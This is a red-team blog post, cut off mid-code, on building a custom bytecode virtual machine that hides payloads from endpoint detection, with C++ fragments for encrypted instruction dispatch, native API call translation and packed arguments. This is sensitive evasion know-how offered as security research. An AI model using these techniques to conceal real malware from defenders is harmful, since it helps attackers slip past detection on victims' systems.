# https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/

[Skip to content](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#content)

[Fox-SRT](https://blog.fox-it.com/author/foxsrt/ "Posts by Fox-SRT")[Blog](https://blog.fox-it.com/category/blog/)September 25, 202421 Minutes

**Authors**: Boudewijn Meijer && Rick Veldhoven

## Introduction

As defensive security products improve, attackers must refine their craft. Gone are the days of executing malicious binaries from disk, especially ones well known to antivirus and Endpoint Detection and Reponse (EDR) vendors. Now, attackers focus on in-memory payload execution for both native and managed applications to evade defensive products. Meanwhile, defensive technologies are becoming increasingly sophisticated, which is forcing attackers to further adapt. In times of such an arms race, how does an attacker stay ahead? And how can malware be future-proofed to evade the sophisticated EDR systems that currently exist and are actively being developed?

This blog post reviews the evolution of one of Fox-IT’s evasive tools, designed to aid in payload delivery during Red Teaming engagements. We will touch on the tool’s history and its future potential in the face of offensive and defensive progress.

## **Historical Perspective**

The core of the arms race between malware and antimalware is as follows: antimalware must classify arbitrary programs, in memory or at-rest, as either benign or malicious while operating under a set of constraints. The products are constrained by the amount of performance a user or customer is prepared to surrender in terms of CPU time, memory or bandwidth while the classification takes place, and by how many false-positives the product generates. If the product is too resource intensive, a customer will complain it is slow. If it quarantines important documents, it potentially does more harm than good. These constraints shape and limit each step in the evolution of antimalware products. Not only AV vendors need to worry about performance when writing tools. Malware authors need to take execution speed, or other system changes, into account when deploying malware. Take for example the recently uncovered XZ[1](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#7585f960-0f16-4135-a8ca-4c1a7afaf522) backdoor that was spotted by a software engineer due to an increase in login time from 0.2 to 0.8 seconds. Had the authors of this piece of code not observably changed the behavior of the system, the backdoor would have likely been deployed successfully.

Since the early days of viruses circulating on floppy disks, writing undetected malware has been a cat-and-mouse game between attackers and defenders. Originally, antivirus software focused strictly on true-positive detection of viruses on the basis of signatures and patterns in a program’s instructions. Absent a mistake in the signature database, a unique signature match guarantees a true-positive match of a malicious sample after which the malicious file can be removed or quarantined. This method of detection strongly adheres to the constraints placed on antimalware products, because simple pattern matches are performant and true-positive detection is almost guaranteed.

For malware authors, the solution was simple: to evade detection, the virus must be made impossible to detect through a unique pattern. This may be achieved by changing the code, or by encrypting the code and decrypting it at runtime. If you automate this, you get what is called a packer: a tool that encrypts, compresses or otherwise changes a virus to evade detection. A packer changes the majority of the code in the virus and adds a stub to the code. This stub is often the first piece of code that is executed when the program is launched. Its job is to undo all changes previously made to the original code (e.g. compression or encryption). After all changes are reverted, execution will be passed to the original code. This stub can also make use of anti-reversing/anti-tampering code that attempts to protect the original code from prying eyes.

This reduces the amount of “attack surface” for signature creation for samples that are on the disk or otherwise stored at rest. This method is also used to compress binaries for distribution, allowing for smaller release packages. Therefore, not all compressed binaries can be marked as malicious.

However, even very small unpacker stubs may match a signature that can be uniquely tied to the packer itself. Combining this signature with some rules related to the amount of entropy in a file, a packer can still be detected with a high degree of accuracy. At this point, the antimalware solution has evolved to utilize metadata about a file, such as entropy, obtaining the ability to detect packed files but at the cost of a higher false-positive rate.

The next step in the arms race for malware authors is to eliminate the potential for a signature match in the unpacker stub. This means that the stub must consist of different instructions each time a new sample is created. An important insight is that “what the code does” and “how the code looks” are not 1:1 mappings. There are infinitely many ways to write down computer code to achieve a certain effect or result. There are therefore infinitely many ways in which a particular unpacking algorithm can be written. A packer that is designed to create the unpacking stub that looks different each time can be called polymorphic. The algorithm or code that performs the changes is called a polymorphic engine[2](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#44855f57-fd3e-421c-982e-d36328596170).

Combining a packer with a polymorphic engine eliminates the “attack surface” for simple signature matches of malware at-rest. Fox-IT has written and maintained two polymorphic packers like this since 2015. Although they still produce good results against modern EDR, even these tools are getting more and more difficult to sneak past defenses. That’s because there’s a conceptual flaw in the polymorphic packer: the original malicious code is still decrypted at some point in order to execute. If antimalware products can time the moment to start scanning for malicious patterns when the packer has finished decoding the malicious code, then detecting malware becomes easy again.

Modern operating systems and processors try to ensure that not all data in a computer’s memory can be executed as code for safety reasons[3](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#52fb0fbc-3a9b-4589-8e2d-9d1e8d0c061c). Particularly, systems are typically designed to prevent the execution of code from writable pages. Therefore, a virus or malware sample that wants to decrypt and/or decompress its own code must first make the changes in writable memory pages. After, the virus changes the page protection to readable and executable and transfers control to the newly modified executable memory. Antimalware products equipped to analyze the behavior of other programs at runtime make use of behavioral patterns like this to decide when to scan the memory of a process for malicious patterns. Because the memory, once decrypted, cannot be changed anymore due to the aforementioned limitations, scanning a process after making memory executable is the ideal time to spot malicious patterns.

Antimalware products that are equipped with rules that generate additional signals to determine if a program is malicious or not, are said to employ “heuristics”. Conceptually, antimalware products have achieved a comprehensive set of features to detect malware execution. The evolutions we’ve seen since the early days of these feature complete products can all be understood as attempts to loosen or lift the constraints set out above: “Cloud-based protection” runs resource intensive heuristics on someone else’s computer; adding human oversight, the “R” in “EDR” lowers the impact of a false-positive and brings humans into the detection and response loop.

How then, can a Red Team smuggle their malware past these new and advanced defenses? In the past, a virus writer might employ what is called a “metamorphic” engine[4](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#cfd6c36c-6510-4789-b2d1-c0e4563fe349). This is an algorithm designed to re-write the entire virus each time it infects a new file, including the entire metamorphic engine itself. Using it ensures that there is never one ‘true’ virus sample that can be detected with a static signature; each copy of the virus is completely different. With a tool like this you would not need a packer, because there are no static patterns that can ever be uniquely tied to your virus. However, the explosion in modern software complexity and the requirement for malware to work on a variety of systems

## **Hiding From Analysis: Virtualisation**

To hide from both static and dynamic analysis of payloads, the generated sample must be resilient to code inspection and code flow analysis. If the _real_ instructions are not revealed to an observer, hardly any conclusions can be drawn from the outer shell. If this is achieved, defensive products would be met with the following limitations when inspecting the payload:

- Difficult to observe instruction patterns;
- Difficult to patch instructions;
- Difficult to ignore instructions;
- Difficult to predict behavior.

Hiding instructions is not something new. Products like VMProtect[5](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#acb3be7f-0d0e-469f-9341-965d785683ff) cloak parts of the code by embedding a virtual machine and generate unique instructions to be executed on this VM. Code that is to be virtualized must be identified either by a marker added to the source code or by the presence of a PDB file containing the symbols. This requirement is something that cannot always be met when using third-party tools. Additionally, this type of protection is aimed at protecting specific functions, like license key checking algorithms, limiting the use for an adversary. Lastly, using existing tools can have a negative impact on the detection ratio, as these products are heavily researched and can contain static signatures like hardcoded section names.

Considering the benefits of a virtualisation layer, however, it is clear that this technique is very powerful.

## **Creating a Custom Virtualisation Layer**

It was decided that a virtualisation layer should be created. This layer consists of a virtual machine implementing opcodes[6](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#2ebbe913-5b00-48a1-b7b0-e23287e60c0b), and bytecode[7](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#c7153637-5f3e-4f28-bf6c-424c707b29e3) executing on the virtual machine. The virtualisation layer that was to be created must match the following requirements and limitations:

1. Bytecode instructions are executed sequentially;
2. Bytecode instructions are hidden before and after execution;
3. The instruction set supports basic x86-64 instructions only;
4. The virtual machine must provide an interface to the system API;
5. The virtual machine implementation must be simple and position independent to support morphing;
6. The virtualisation layer must work without access to source code or debug symbols.

Creating a virtualisation layer started with a design of the instructions to be executed, the virtual machine, and the supported instruction set. Additionally, the layout of the final payload was created where all data must be present in a position independent format and could be executed like shellcode. This allows the payload to be embedded in other executable formats (e.g. executables or DLLs), and allows for dynamic execution when staging malware.

For example, the following layout would allow for the above functionality. In this example, the virtual machine must start with a correcting stub that correctly sets the virtual machine argument registers to their respective values:

[![](https://i0.wp.com/blog.fox-it.com/wp-content/uploads/2024/08/layout.png?resize=800%2C248&ssl=1)](https://i0.wp.com/blog.fox-it.com/wp-content/uploads/2024/08/layout.png?ssl=1) _Example of a data structure containing all required building blocks within position independent code._

## **The Anatomy of an Instruction**

To keep the virtual machine architecture simple, an instruction format was created to be consistent in length between instruction and operand types. This design decision allows the omission of a Length Disassembler Engine (LDE)[8](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#1960560c-70db-407a-a395-9e1603895b60), and can simply use the instruction pointer as an index to the current instruction. All information present in normal, non-SSE[9](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#389cbcc6-797d-4476-9eba-0e3e964d20ff)/AVX[10](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#745fab9c-8318-41e7-8c04-e5e6ed908584) x86 instructions must be included.

At its core, an instruction identifies the operation that must be performed, and optionally what data is provided in the form of operands. An operand can be one of three types:

1. **Immediate value**: a constant value embedded in the instruction;
2. **Memory location**: a memory location pointed to by the instruction;
3. **Register**: a register, or part of one, identified by the instruction.

In order to obtain data from an operand, a generic format must be created that encompasses the different operand types. It was decided that a single 64-bit field could be used to hold the different types of operands, as all of the necessary data of the aforementioned types can be embedded into 64 bits.

The structures below show the layout of each operand type:

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/)

|     |     |
| --- | --- |
|  | struct ImmediateOperand { |
|  | Value value; // A constant value |
|  | }; // size: 8 bytes |
|  |  |
|  | struct MemoryOperand { |
|  | uint8\_t size; // The effective size of the operand (8, 16, 32, 64 bits) |
|  | uint8\_t base; // A regiser holding a pointer value to the base address |
|  | uint8\_t index; // A register holding the index of the array |
|  | uint8\_t scale; // A constant multiplier of 1, 2, 4, or 8 |
|  | int32\_t displacement; // A value to be added to the calculated address |
|  | }; // size: 8 bytes |
|  |  |
|  | struct RegisterOperand { |
|  | uint8\_t reg; // A base register of the x86-64 register set |
|  | uint8\_t chunk; // The specific register chunk: low, high, word, dword, qword |
|  | uint16\_t size; // The effective size of the operand (8, 16, 32, 64 bits) |
|  | uint32\_t pad; // Padding to meet the 64 bit size requirement |
|  | }; // size: 8 bytes |
|  |  |
|  | union Operand { |
|  | ImmediateOperand imm; // View the data as an immediate operand |
|  | MemoryOperand mem; // View the data as a memory operand |
|  | RegisterOperand reg; // View the data as a register operand |
|  | }; // size: 8 bytes |

[view raw](https://gist.github.com/fox-srt/be65d595529fee89d202115d79dae0cf/raw/07553c9e32406124e546c25dd4b5b97fe08642ff/operand.h) [operand.h](https://gist.github.com/fox-srt/be65d595529fee89d202115d79dae0cf#file-operand-h)
hosted with ❤ by [GitHub](https://github.com/)

**Note**: _The `Value` type of the immediate operand is a simple `union` with `(u)int8_t` to `(u)int64_t` members. This makes it trivial to index the correct data during implementation of opcodes._

To indicate the instruction’s `opcode`, a single 1-byte value can be used. This provides 256 unique opcodes, which should be enough to implement basic behavior. Lastly, the type of each operand must be embedded within the instruction format, as opcode implementations must be able to interrogate these types.

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/)

|     |     |
| --- | --- |
|  | struct Instruction { |
|  | uint8\_t opcode; // The opcode of the instruction |
|  | uint8\_t lparam\_type : 4; // The type of the first (left) operand |
|  | uint8\_t rparam\_type : 4; // The type of the second (right) operand |
|  | Operand lparam; // The first (left) operand |
|  | Operand rparam; // The second (right) operand |
|  | }; // size: 18 bytes |

[view raw](https://gist.github.com/fox-srt/77864235f6cadde79e086b999a722e73/raw/fd88104ec24bd0885f0a4212cd36fdbeabdf4a6a/instruction.h) [instruction.h](https://gist.github.com/fox-srt/77864235f6cadde79e086b999a722e73#file-instruction-h)
hosted with ❤ by [GitHub](https://github.com/)

## **Protecting Instructions**

To meet requirement two, _“Instructions are hidden before and after execution”_, instructions are protected using encryption. Many encryption algorithms can be used to hide instructions. However, it is required for the instruction size to remain the same, as the instruction will be decrypted and encrypted in-place and will not be moved to a temporary buffer. This removes the necessity for dynamic memory allocation from within the virtual machine. Additionally, the chosen encryption scheme must be trivial to implement, as the code will be located in the virtual machine and thus create an ‘attack surface’ for signature detection. Implementing complex algorithms is detrimental to the ability to effectively manipulate the code using a polymorphic engine.

## **The Anatomy of the Virtual Machine**

The virtual machine resembles a virtual CPU, implementing all the available opcodes. Furthermore, the available registers, CPU flags, and stack are part of the virtual machine object. Lastly, the virtual machine holds a pointer to the bytecode buffer necessary for execution. An added benefit of implementing the virtual machine is that the real stack is also abstracted away. Heuristics that attempt to spot malicious behavior from the stack will not succeed.

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/)

|     |     |
| --- | --- |
|  | struct Context { |
|  | uint32\_t ip; // Instruction pointer |
|  | uint8\_t flags; // CPU flags to be manipulated by opcodes |
|  | Register registers\[17\]; // General Purpose Registers (rax, … r15 and gs) |
|  | Instruction\* instructions; // A pointer to the start of the bytecode buffer |
|  | uint8\_t stack\[STACK\_SIZE\]; // The virtual machine stack |
|  | }; |

[view raw](https://gist.github.com/fox-srt/aa0fd9378a7d0e6594ee0d046c2ccef6/raw/0ef1cf0905d48e2eb08b8edde847fce9fabfb847/context.h) [context.h](https://gist.github.com/fox-srt/aa0fd9378a7d0e6594ee0d046c2ccef6#file-context-h)
hosted with ❤ by [GitHub](https://github.com/)

Functions to initialize the virtual machine context, to obtain the current instruction, and to load and store values based on the instruction operands were created to aid in the implementation of opcodes within the virtual machine.

Once initialized, the virtual machine can enter its dispatch loop. This loop consists of obtaining the current instruction and executing the opcode identified by the opcode field in the instruction object. The instruction is decrypted before execution and is encrypted after. A dispatch function could be implemented as follows:

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/)

|     |     |
| --- | --- |
|  | void dispatch\_instruction(Context\* vm) { |
|  | uint32\_t ip = vm->ip; |
|  | decrypt\_instruction(vm, ip); |
|  |  |
|  | switch (vm->instructions\[ip\].opcode) { |
|  | case Opcode::ADD: opcode\_add(vm); next\_instruction(vm); break; |
|  | case Opcode::AND: opcode\_and(vm); next\_instruction(vm); break; |
|  | case Opcode::BT: opcode\_bt(vm); next\_instruction(vm); break; |
|  | … |
|  | } |
|  |  |
|  | encrypt\_instruction(vm, ip); |
|  | } |

[view raw](https://gist.github.com/fox-srt/b8b3ba24a09cde19973f69d85a1879a8/raw/e668ee989012f33a4f5c843e7f4fb942457201a5/dispatch.cpp) [dispatch.cpp](https://gist.github.com/fox-srt/b8b3ba24a09cde19973f69d85a1879a8#file-dispatch-cpp)
hosted with ❤ by [GitHub](https://github.com/)

An attentive reader may have noticed the construction of the temporary variable `ip`, which is used in further operations. This originates from the fact that any instructions modifying the instruction pointer, like `jcc`, `call`, and `ret`, will result in a modified instruction pointer when the opcode is finished. Therefore, the instruction pointer can no longer be used to re-encrypt the original instruction that was executed.

## **Implementation of a Basic Opcode**

The following function implements the bit test (`bt`) opcode[11](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#3e7aeb95-4e7c-44d8-8927-61a261e8050f):

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/)

|     |     |
| --- | --- |
|  | void opcode\_bt(Context\* vm) { |
|  | // get the current instruction from the context |
|  | Instruction\* i = get\_current\_instruction(vm); |
|  |  |
|  | // load the value and the bit to test |
|  | Value dst = fetch\_value(vm, i->lparam\_type, i->lparam); |
|  | Value src = fetch\_value(vm, i->rparam\_type, i->rparam); |
|  |  |
|  | // get the size in bits of the value to check |
|  | size\_t size = get\_operand\_size(i->lparam\_type, i->lparam); |
|  |  |
|  | // set the carry flag to the result of the bit test |
|  | switch (size) { |
|  | case 8: vm->flags.cf = (dst.u8 & (1 << src.u8)) != 0; break; |
|  | case 16: vm->flags.cf = (dst.u16 & (1 << src.u16)) != 0; break; |
|  | case 32: vm->flags.cf = (dst.u32 & (1 << src.u32)) != 0; break; |
|  | case 64: vm->flags.cf = (dst.u64 & (1ull << src.u64)) != 0; break; |
|  | } |
|  | } |

[view raw](https://gist.github.com/fox-srt/468df043877b48ae0921f5bcc65b6454/raw/03df21978f32f86204f21b6b29f263f5991acffe/opcode_bt.cpp) [opcode\_bt.cpp](https://gist.github.com/fox-srt/468df043877b48ae0921f5bcc65b6454#file-opcode_bt-cpp)
hosted with ❤ by [GitHub](https://github.com/)

## **Improving the Bytecode Process: Transpiling**

Initially, all bytecode created to execute in the virtual environment was written in assembly by hand. This provided the control needed to make sure specific opcodes and operand types were used, and as a test a PE loader was implemented in bytecode. As this limitation came at a major cost in development time and flexibility, a new method of generating bytecode was used: compiling and transpiling of C/C++ programs. This was chosen over using output directly from the assembler, as parsing these text files proved to be cumbersome and error-prone. Instead, the resulting linked binary was fed to a disassembler.

The disassembling of a binary is performed using the iced-x86 library[12](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#ad0bb794-316c-4597-88f6-ecbc4030e79c). This library allows for the conversion of x86 instructions to the custom format -described in the earlier section: _The Anatomy of an Instruction_– by checking the opcode of the instruction, the types of operand(s) and its value(s). Eventually, once all the x86 instructions are converted, the now transpiled bytecode can be interpreted by the virtual machine.

[![](https://i0.wp.com/blog.fox-it.com/wp-content/uploads/2024/08/transpiling.png?resize=800%2C100&ssl=1)](https://i0.wp.com/blog.fox-it.com/wp-content/uploads/2024/08/transpiling.png?ssl=1) _The bytecode generation process from source code to eventual bytecode._

The implementation of the transpiler instantly enabled us to support a large amount of existing tools, and made writing new tools easier. Most Position-independent Code (PIC)[13](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#54e90f32-844d-4c9a-b618-0c30b0f819ea) tools that compile from C/C++, including some BOFs[14](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#21563ac9-99ea-4aca-a16e-513b183fc1ad), can also be ported to execute on the virtual machine with relative ease.

## **Limitations to Bytecode Implementation**

One of the limitations of the virtual machine implementation is shared with that of the bytecode. PIC must be created in order to generate valid bytecode that executes on the VM. In practice, this means that everything is relative to the current instruction pointer, and no references to other libraries or parts of other sections can exist:

- No static variables;
- No global variables;
- No strings;
- No static dependencies on libraries.

## **Supporting Native API Calls**

To allow interfacing with the OS layer, bytecode must be able to perform native API calls. A translation layer must exist between the bytecode and native environment. The `call` instruction is used by compilers to invoke APIs, requiring the virtual machine’s `call` implementation to support this translation. Unfortunately, once a `call` instruction is encountered, no information is known to the virtual machine related to the number of arguments that must be forwarded. To resolve this problem, the bytecode can prepend the number of arguments when calling an API, giving the virtual machine layer enough information to translate the call into native execution. To programmatically perform this task, variadic arguments in C++ templates can be used to automatically deduce the amount of arguments passed:

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/)

|     |     |
| --- | --- |
|  | template <typename Ret, typename … Args> |
|  | struct apicall<Ret(Args…)> { |
|  | static decltype(auto) call(const void\* target, Args … args) { |
|  | constexpr size\_t nargs = sizeof…(Args); // Calculate the number of arguments passed |
|  | using f = Ret(\_\_stdcall\*)(size\_t, Args…); // Define the signature of the API to call |
|  | return ((f)target)(nargs, args…); // Invoke the API and return its result |
|  | } |
|  | }; |
|  |  |
|  | int main() { |
|  | FARPROC \_Sleep = get\_address\_of\_sleep(); |
|  | apicall<decltype(Sleep)>::call(\_Sleep, 10'000); |
|  | return 0; |
|  | } |

[view raw](https://gist.github.com/fox-srt/8a00738abb4648ae2784dc239e6e2260/raw/50beaddbf1ef6331197f3f67220f67de774759f2/apicall.cpp) [apicall.cpp](https://gist.github.com/fox-srt/8a00738abb4648ae2784dc239e6e2260#file-apicall-cpp)
hosted with ❤ by [GitHub](https://github.com/)

As specified in Microsoft’s x64 `__stdcall`[15](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#c9c503f8-ef6a-4456-a99d-d3dbe23b07ca) calling convention, the first four integer or pointer arguments are passed using the registers `rcx`, `rdx`, `r8` and `r9`, with the remaining arguments being passed on the stack. This means that at the time of executing the `call` instruction, `rcx` holds the number of arguments that must be passed to the API. The virtual machine can extract and inspect this value, and use it to correctly perform the call:

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/)

|     |     |
| --- | --- |
|  | auto target = fetch\_value(vm, i->lparam\_type, i->lparam); |
|  | auto nargs = vm->registers.rcx.qword; |
|  |  |
|  | // extract the arguments |
|  | … |
|  |  |
|  | // Invoke the api |
|  | auto result = syscall(target, …); |
|  |  |
|  | // return the result to the bytecode environment |
|  | vm->registers.rax = result; |

[view raw](https://gist.github.com/fox-srt/c4f90ba74289af3ec894357a062e0e84/raw/1733669957835c3f2f0a55e1e436662d716ec98d/vm.cpp) [vm.cpp](https://gist.github.com/fox-srt/c4f90ba74289af3ec894357a062e0e84#file-vm-cpp)
hosted with ❤ by [GitHub](https://github.com/)

The real values of the arguments are stored in `rdx`, `r8`, `r9` and on the stack. When extracting the arguments from the stack, one must remember to keep the shadow space[16](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#beb24e60-5081-4d4d-9893-171865561078) in mind.

Visually, the process looks like this:

[![](https://i0.wp.com/blog.fox-it.com/wp-content/uploads/2024/08/apicall.png?resize=800%2C605&ssl=1)](https://i0.wp.com/blog.fox-it.com/wp-content/uploads/2024/08/apicall.png?ssl=1) _A virtualized `call` instruction invokes `ntdll!NtAllocateVirtualMemory`. This call is translated to a native `call` and the API is invoked. The resulting value is returned to the VM._

## **Supporting Bytecode Function Callbacks**

Keeping in mind the porting of existing programs to the bytecode architecture, one cannot omit the support for function callbacks within code. Take for example a simple linked list implementation, with a `list_search` function taking a predicate callback:

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/)

|     |     |
| --- | --- |
|  | structNode { |
|  | int value; |
|  | node\* next; |
|  | }; |
|  |  |
|  | structSearchContext { |
|  | int value; |
|  | }; |
|  |  |
|  | Node\* list\_search(Node\* head, bool(\*predicate)(Node\* n, constvoid\\* ctx), const void\* ctx); |
|  |  |
|  | boolsearcher(Node\* n, constvoid\\* ctx) { |
|  | return n->value == ((SearchContext\*)ctx)->value; |
|  | } |
|  |  |
|  | intmain() { |
|  | Node head; |
|  |  |
|  | // initialize and populate list |
|  | … |
|  |  |
|  | SearchContext ctx = { 10 }; |
|  | Node\* found = list\_search(&head, searcher, &ctx); |
|  |  |
|  | return0; |
|  | } |

[view raw](https://gist.github.com/fox-srt/e18b2895a83eaf4361cbe22e333ed9bb/raw/ce4618d94c81984ecc2fb7375d5e5dd0836c62d5/list_search.cpp) [list\_search.cpp](https://gist.github.com/fox-srt/e18b2895a83eaf4361cbe22e333ed9bb#file-list_search-cpp)
hosted with ❤ by [GitHub](https://github.com/)

However, a problem arises: how does the virtual machine differentiate between a normal bytecode function call, a native API call, and a function callback? The difference between the first two is clear: the bytecode function call is a call to an address within the bytecode and is known at compile time, where the API call is a dynamic call, meaning a call to a function pointer stored in a register or memory location. Given that a callback within bytecode is a dynamic call, too, the virtual machine must be provided with information about the type of call being made.

To load a function pointer as an argument, a `lea`[17](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#92454169-a059-4c6e-bbcb-b92f8bac754c) instruction is generated with its right operand referencing a memory address. This referenced memory address uses the instruction pointer (`rip`) register as the `base` field of the memory operand. When transpiling, such cases can be identified. To store this information, a new type of operand can be added to the already existing three types -listed in _“The Anatomy of an Instruction”_– (e.g. `Function`). When the virtual machine executes the `lea` instruction, it can check for the type of operand. If this operand’s type is `Function`, a tag can be added to the high 32 bits of the value, for example `0xDEADBEEF`.

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/)

|     |     |
| --- | --- |
|  | value = (0xDEADBEEFull << 32) \| (value & 0xffffffff); |

[view raw](https://gist.github.com/fox-srt/34cd71777469c1443e25c42be84f61df/raw/3621afbb6cf8c7b3c6862f671ca87ac2abe72e59/tag_example.cpp) [tag\_example.cpp](https://gist.github.com/fox-srt/34cd71777469c1443e25c42be84f61df#file-tag_example-cpp)
hosted with ❤ by [GitHub](https://github.com/)

Once the `call` instruction is invoked, the value of the operand can be interrogated. If this value contains the previously added tag, a callback is requested. To perform the call, the tag is stripped from the value and the instruction pointer can be set accordingly.

## **Supporting User-Defined Arguments**

Depending on the type of program that is executing, user-defined arguments are required. Take for example a program that simply sleeps for a period of time. How long should this program sleep for? Hardcoding these values is not always an option. Early on in the development of the project, a simple data structure was defined which could be provided to the bytecode’s entry point:

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/)

|     |     |
| --- | --- |
|  | struct Data { |
|  | size\_t size; // Size of data including the \`Data\` header |
|  | uint8\_t key\[KEY\_SIZE\]; // Decryption key of the payload |
|  | uint8\_t payload\[0\]; // Payload data |
|  | }; |
|  |  |
|  | int bytecode\_main(Data\* data); |

[view raw](https://gist.github.com/fox-srt/110e574a3af073a9bdd0a69aba82f7de/raw/6d370f74b9f361dcb01b091e982758b19cfa7ec1/bytecode.cpp) [bytecode.cpp](https://gist.github.com/fox-srt/110e574a3af073a9bdd0a69aba82f7de#file-bytecode-cpp)
hosted with ❤ by [GitHub](https://github.com/)

Accompanying this, each bytecode project contained a script that packaged data in a way that could be understood by the bytecode. However, there was no consistency between these scripts and the method of extraction. For example, extracting two 4-byte integers is simpler than extracting two strings due to their variable size.

To standardize this process, and to include it into the building step itself instead of running a random script, a key-value solution was created in combination with an API that can interrogate the type and value of each argument. This is different from parameter packing that Cobalt Strike uses in its BOFs[18](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#b4e4ab6a-3024-4673-b724-fea7bedd7042), as default arguments, or arguments that are not strictly required are supported. Additionally, each argument is encrypted separately. This allows for a PE packer to extract domain-keying information before extracting the PE data.

The following API is defined:

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/)

|     |     |
| --- | --- |
|  | enum Type { |
|  | Invalid, Boolean, Integer, String, Data |
|  | }; |
|  |  |
|  | structArgument { |
|  | size\_t size; // The size of the argument including the header |
|  | Type type; // The type of the argument |
|  | size\_t tag; // The identifying tag of the argument |
|  | uint8\_t key\[KEY\_SIZE\]; // The payload encryption key |
|  | uint8\_t payload\[0\]; // The argument data |
|  | }; |
|  |  |
|  | structArguments { |
|  | size\_t size; // The total size of all arguments in bytes |
